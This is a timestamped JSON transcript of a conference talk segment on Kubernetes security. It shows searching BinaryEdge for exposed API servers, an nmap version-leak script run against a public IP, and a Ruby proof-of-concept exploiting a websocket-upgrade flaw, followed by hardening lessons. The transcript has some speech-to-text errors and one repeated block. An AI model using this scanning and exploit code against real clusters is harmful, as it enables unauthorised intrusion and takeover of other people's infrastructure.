@@ -1,0 +1,175 @@
+{
+  "segment_start": "00:19:20",
+  "language": "en",
+  "blocks": [
+    {
+      "t": "00:19:20",
+      "spoken": "an animated gift as a gift. All right, well, never mind. There is a link there to Ghost. Basically, it's very easy to build that Ghost test suites. I love them.",
+      "speaker": "Speaker 1",
+      "on_screen_text": "Security Testing with Goss",
+      "visual": "A speaker stands on stage next to a slide titled 'Security Testing with Goss' which also displays a GitHub link. The speaker gestures while talking.",
+      "kind": "slide"
+    },
+    {
+      "t": "00:19:28",
+      "spoken": "Testing is cool. It's the only way we can prove that we're secure, but we're not proving the absence of bugs. We're not proving that the system is actually secure. We're just saying for our particular model of it and our understanding at this point in time, it conforms to some level of security.",
+      "speaker": "Speaker 1",
+      "on_screen_text": "TESTING IS COOL It's how we \"prove\" we're secure Against known quantities Test enough to install confidence \"Goldilocks Test Suites\" -- not too many, not too few",
+      "visual": "The slide changes to 'TESTING IS COOL' with bullet points. The speaker continues to talk, explaining the purpose and limitations of security testing.",
+      "kind": "slide"
+    },
+    {
+      "t": "00:19:44",
+      "spoken": "Okay. But that was too easy, right?",
+      "speaker": "Speaker 1",
+      "on_screen_text": "too easy",
+      "visual": "The slide changes to a simple white background with the text 'too easy'. The speaker looks at the audience and smiles.",
+      "kind": "slide"
+    },
+    {
+      "t": "00:19:49",
+      "spoken": "Uh, let's find some public clusters and prone those.",
+      "speaker": "Speaker 1",
+      "on_screen_text": "public clusters drive by pew pew pew",
+      "visual": "The slide changes to 'public clusters drive by' with 'pew pew pew' below it. The speaker makes a sound effect and gestures.",
+      "kind": "slide"
+    },
+    {
+      "t": "00:19:54",
+      "spoken": "Right. And in clusters in the wild. How many insecure Kubernetes hosts do you think we can find in a few seconds? 10? 100? 1000? Very good. It'll be a lot. Let's go.",
+      "speaker": "Speaker 1",
+      "on_screen_text": "hunting clusters in the wild Our trusted LAN Checkpoint FW Cisco FW Huawei FW The Bad Internet Protection against Russian backdoors Protection against Israeli backdoors Protection against Chinese backdoors Protection against US backdoors",
+      "visual": "The slide displays a diagram titled 'hunting clusters in the wild', showing a series of firewalls protecting a LAN from 'The Bad Internet'. The speaker interacts with the audience.",
+      "kind": "slide"
+    },
+    {
+      "t": "00:20:16",
+      "spoken": "Okay, this is. Yeah, right. I have my head of security to thank for that. Uh, right, this is Binary Edge. Binary Edge is Showdan for infrastructure. This search term finds open Kubernetes. It's not a nice day if you're on this list.",
+      "speaker": "Speaker 1",
+      "on_screen_text": "binaryedge Host Images Data Dumps Torrents Domains Services API Documentation Risk Score Search for: BINARYEDGE WE SCAN THE ENTIRE INTERNET Filter by: IP ADDRESS, OS, DATABASE, IOT, CAMERA Ports Countries Entries Malware 6443/tcp United States 273 6443/tcp China 315 6443/tcp India 192 6443/tcp Germany 109 6443/tcp Canada 59 6443/tcp United Kingdom 37 Results for your query: /api/kubernetes_master_api_version",
+      "visual": "The screen switches to a web browser showing the BinaryEdge platform. The speaker points to the screen, explaining how it's used to find open Kubernetes instances.",
+      "kind": "screen_share"
+    },
+    {
+      "t": "00:20:32",
+      "spoken": "Uh, which uh, where are we? This is actually a web page. Let's uh, let's go back to this.",
+      "speaker": "Speaker 1",
+      "on_screen_text": "hunting clusters in the wild Our trusted LAN Checkpoint FW Cisco FW Huawei FW The Bad Internet Protection against Russian backdoors Protection against Israeli backdoors Protection against Chinese backdoors Protection against US backdoors",
+      "visual": "The screen briefly returns to the 'hunting clusters in the wild' slide.",
+      "kind": "slide"
+    },
+    {
+      "t": "00:20:35",
+      "spoken": "Uh, this may not be legal in your jurisdiction. Alert. What Binary Edge does is it connects to unauthenticated API endpoints. That is a gray, gray area. So take this as you will, but the platform has already scanned the IP4 address space for us and then poked at what it has found. Uh, we can see up here that is the query. And down here, this is some Chinese honey pots, actual cluster, who knows, I wouldn't touch it with a barge pole.",
+      "speaker": "Speaker 1",
+      "on_screen_text": "binaryedge THIS MAY NOT BE IN YOUR JURISDICTION This platform has already portscanned the IPV4 address space for us indexed all the content and preemptively attacked it",
+      "visual": "The screen shows the BinaryEdge website again, with a red box highlighting the search query and another red box highlighting a result. A new text box on the left warns about legal jurisdiction. The speaker explains the platform's functionality and potential legal issues.",
+      "kind": "screen_share"
+    },
+    {
+      "t": "00:21:04",
+      "spoken": "So, here is one I pwned earlier.",
+      "speaker": "Speaker 1",
+      "on_screen_text": "Here's one I pwnd earlier BLUE PETER Classic Blue Peter Makes",
+      "visual": "The slide changes to 'Here's one I pwnd earlier' with an image of a 'Blue Peter' book cover. The speaker gestures to the screen.",
+      "kind": "slide"
+    },
+    {
+      "t": "00:21:13",
+      "spoken": "Let's go down here and where are we now? Okay.",
+      "speaker": "Speaker 1",
+      "on_screen_text": "15:04:25 nmap-kube-apiserver",
+      "visual": "The screen switches to a terminal window, showing a command prompt. The speaker is preparing for a live demo.",
+      "kind": "demo"
+    },
+    {
+      "t": "00:21:17",
+      "spoken": "So, let's uh, still on these. So let's test the API server and see if it is leaking anything useful. Um, this is an Nmap script that runs in the Nmap scripting engine.",
+      "speaker": "Speaker 1",
+      "on_screen_text": "The Banner Banhammer Let's test the API server and see if it's leaking Use my nice nmap script https://gist.github.com/sublimino/c35737936980d0f77d3e2e0b6d4611",
+      "visual": "The slide changes to 'The Banner Banhammer' with bullet points about testing the API server and a link to an Nmap script. The speaker explains the script's purpose.",
+      "kind": "slide"
+    },
+    {
+      "t": "00:21:28",
+      "spoken": "Let's go back up here to the. Um, and so Nmap Q API server. Um, I run this with a little bit. Yeah, so all we're doing here is. Uh, not that. What's that? I can't even read it.",
+      "speaker": "Speaker 1",
+      "on_screen_text": "15:04:25 nmap-kube-apiserver nmap-kube-discover nmap-kube-apiserver nmap-kube-apiserver () function if ! command nmap version 7+ required\" ; then fi local REGEX=\"major\": \"([0-9.]+)\", \"gitVersion\": \"buildDate\": \"([0-9.]+)\", \"goVersion\": \"([0-9.]+)\", \"platform\": \"linux/amd64\" -e 's,^,https?://,e,s,^,p,g'}\" -d --script=http-get --script-args http-get.path=/version, http-get.match='gitVersion.buildDate', http-get.showresponse, http-get.forceTLS nmap-apiserver",
+      "visual": "The screen returns to the terminal. The speaker types `nmap-kube-apiserver` and then scrolls through the script's code, explaining its function.",
+      "kind": "demo"
+    },
+    {
+      "t": "00:21:54",
+      "spoken": "Okay. So, what we've done there is we've looked for a certain port, we check for an HTTP response and run a regular expression over it. The regular expression matches get version, get commit and we can see here that the API server, the Kubernetes API server is leaking its version information. You would not do this with Nginx. You would not do it with Apache. We learned this lesson a long time ago, but evidently Kubernetes is better than us.",
+      "speaker": "Speaker 1",
+      "on_screen_text": "NMAP scan report for kube-andy-1 (167.172.54.151) Host is up, received reset ttl 57 (0.041s latency). Scanned on Sat Feb 01 00:00:00 2020 TCP open syn-ack ttl 57 (0.041s) Response: { \"major\": \"1\", \"minor\": \"11\", \"gitVersion\": \"v1.11.4\", \"gitCommit\": \"f894a8ee8a5d0abfa53c66f7b3e02e86d4611\", \"buildDate\": \"2019-10-03T...\", \"goVersion\": \"go1.10.2\", \"platform\": \"linux/amd64\" } Final Host Script results: _nmap-kube-apiserver_ (167.172.54.151) Nmap done: 1 IP address (1 host up) scanned in 0.82 seconds. Raw packets sent: 5 (260B) | Rcvd: 5 (240B)",
+      "visual": "The terminal displays the output of the Nmap scan, showing detailed version information for the Kubernetes API server. The speaker highlights the leaked version data.",
+      "kind": "demo"
+    },
+    {
+      "t": "00:22:23",
+      "spoken": "Uh, where are we now? Uh, so, well, what do we think we can do about that version? Any ideas if we can attack it?",
+      "speaker": "Speaker 1",
+      "on_screen_text": "The Banner Banhammer Let's test the API server and see if it's leaking Use my nice nmap script https://gist.github.com/sublimino/c35737936980d0f77d3e2e0b6d4611",
+      "visual": "The screen returns to the 'The Banner Banhammer' slide. The speaker asks the audience about potential attacks.",
+      "kind": "slide"
+    },
+    {
+      "t": "00:22:31",
+      "spoken": "Well, 1114 has uh one of the mother of all TVs associated with it. It is error it's poor error handling in in the MTLS server. Essentially what happens is a web socket connection is instantiated, that is bundled in a TLS pipe, if you like, so the encryption is established and then the web socket communication goes over that. There is incorrect handling of the web socket error code, so the tunnel would stay open and we could then send whatever commands we wanted through. This was initially the most extreme remote code execution, actually it's scoped to reflective APIs and it's a little bit more difficult to exploit than we thought about, but let's try anyway.",
+      "speaker": "Speaker 1",
+      "on_screen_text": "API server Pwnage",
+      "visual": "The slide changes to 'API server Pwnage' with a green, Matrix-like visual of figures in a hallway. The speaker explains a vulnerability in the Kubernetes API server.",
+      "kind": "slide"
+    },
+    {
+      "t": "00:23:07",
+      "spoken": "Okay, so we've done what we have here. Okay. So first of all, we will just run this. So we can see we're not actually running the exploits and as such we have.",
+      "speaker": "Speaker 1",
+      "on_screen_text": "NMAP scan report for kube-andy-1 (167.172.54.151) Host is up, received reset ttl 57 (0.041s latency). Scanned on Sat Feb 01 00:00:00 2020 TCP open syn-ack ttl 57 (0.041s) Response: { \"major\": \"1\", \"minor\": \"11\", \"gitVersion\": \"v1.11.4\", \"gitCommit\": \"f894a8ee8a5d0abfa53c66f7b3e02e86d4611\", \"buildDate\": \"2019-10-03T...\", \"goVersion\": \"go1.10.2\", \"platform\": \"linux/amd64\" } Final Host Script results: _nmap-kube-apiserver_ (167.172.54.151) Nmap done: 1 IP address (1 host up) scanned in 0.82 seconds. Raw packets sent: 5 (260B) | Rcvd: 5 (240B) Starting... Attacking kube-andy-1:6443 Opening socket Socket open NOT EXPLOITING. Further requests will FAIL Abusing privilege? Request GET /apis/metrics.k8s.io/v1beta1/pods HTTP/1.1 Host: kube-andy-1 X-Remote-User: system:serviceaccount:kube-system:horizontal-pod-autoscaler Content-Type: application/json Date: Sat, 01 Feb 2020 14:34:20 GMT Content-Length: 135 Closed Socket closed",
+      "visual": "The screen shows a terminal running a `hack.rb` script. The output indicates 'NOT EXPLOITING' and a '403 Forbidden' error, demonstrating the initial state without the exploit.",
+      "kind": "demo"
+    },
+    {
+      "t": "00:23:25",
+      "spoken": "And all we're doing here is opening a socket and sending this web socket upgrade connection six times. But it's not handled correctly because we keep on sending it in.",
+      "speaker": "Speaker 1",
+      "on_screen_text": "hack.rb require 'json' require 'socket' require 'openssl' require 'uri' ENV['HOST'] ||= \"kube-andy-1\" ENV['PORT'] ||= \"6443\" ENV['EXPLOIT'] ||= \"false\" metrics = \"/apis/metrics.k8s.io/v1beta1\" host = ENV['HOST'] port = ENV['PORT'] ssl_socket = OpenSSL::SSL::SSLSocket.new TCPSocket.new(host, port) ssl_socket.sync = true ssl_socket.connect if ENV['EXPLOIT'] == \"true\" then request = \"GET #{metrics} HTTP/1.1\\r\\nHost: #{host}\\r\\nUpgrade: websocket\\r\\nConnection: upgrade\\r\\n\\r\\n\" else request = \"GET #{metrics} HTTP/1.1\\r\\nHost: #{host}\\r\\n\\r\\n\" end puts request ssl_socket.puts request puts ssl_socket.gets else # NOT EXPLOITING. Further requests will fail\" end",
+      "visual": "The terminal displays the Ruby code for the `hack.rb` script. The speaker explains how the script attempts to upgrade a connection.",
+      "kind": "demo"
+    },
+    {
+      "t": "00:23:37",
+      "spoken": "If we then uh, say that we will exploit this to run that piece of code, you'll see that what we have at the bottom, which is a 403 Forbidden, magically becomes a 200 OK. As we have an unauthenticated request handled by the API server through that connection. This is exploitable, but a bit more difficult and uh, I will leave that as an exercise to the reader. Seven minutes.",
+      "speaker": "Speaker 1",
+      "on_screen_text": "Starting... Attacking kube-andy-1:6443 Opening socket Socket open Attacking kube-andy-1:6443 Upgrade: websocket Connection: upgrade Content-Type: application/json Date: Sat, 01 Feb 2020 14:34:20 GMT Content-Length: 135 Closed Socket closed",
+      "visual": "The terminal shows the `hack.rb` script being run again, but this time with the exploit enabled. The output now shows a '200 OK' response, demonstrating successful exploitation. The speaker explains the change.",
+      "kind": "demo"
+    },
+    {
+      "t": "00:23:55",
+      "spoken": "Okay, we can now watch it burn. We can run some in it if we actually got pod deployment access, we could deploy nano miners or change plus to creds, or delete all the nodes.",
+      "speaker": "Speaker 1",
+      "on_screen_text": "API server Pwnage",
+      "visual": "The screen returns to the 'API server Pwnage' slide with the Matrix-like visual. The speaker discusses the implications of the exploit.",
+      "kind": "slide"
+    },
+    {
+      "t": "00:24:01",
+      "spoken": "So more lessons, don't run a public API server endpoint on the internet. It's a privileged API and zero trust does not mean just trust everything is infinitely secure and all our authentication and authorization mechanisms just work. They don't, we would layer ourselves in.",
+      "speaker": "Speaker 1",
+      "on_screen_text": "Watch It Burn unauthenticated client malicious websockets upgrade potential escalation of privilege",
+      "visual": "The slide changes to 'Watch It Burn' with bullet points listing 'unauthenticated client', 'malicious websockets upgrade', and 'potential escalation of privilege'. The speaker explains the consequences.",
+      "kind": "slide"
+    },
+    {
+      "t": "00:24:13",
+      "spoken": "So more lessons, don't run a public API server endpoint on the internet. It's a privileged API and zero trust does not mean just trust everything is infinitely secure and all our authentication and authorization mechanisms just work. They don't, we would layer ourselves in.",
+      "speaker": "Speaker 1",
+      "on_screen_text": "Here cometh the Lesson Tin foil hats are cool DEFCON says so Don't run a Kubernetes API server endpoint on the public internet!!!one",
+      "visual": "The slide changes to 'Here cometh the Lesson' with an image of a tin foil hat and bullet points. The speaker delivers key takeaways about securing API endpoints.",
+      "kind": "slide"
+    }
+  ],
+  "segment_summary": "This segment focuses on security testing, specifically demonstrating how to find and exploit insecure Kubernetes clusters. The speaker introduces BinaryEdge as a tool for discovering open Kubernetes API endpoints on the internet. A live demo showcases an Nmap script used to identify version information leakage from a Kubernetes API server. The speaker then explains a critical vulnerability (CVE) related to poor error handling in the MTLS server, which allows an unauthenticated client to exploit a malicious websocket upgrade, potentially leading to privilege escalation. The segment concludes with lessons on avoiding public API server endpoints and the importance of layered security."
+}
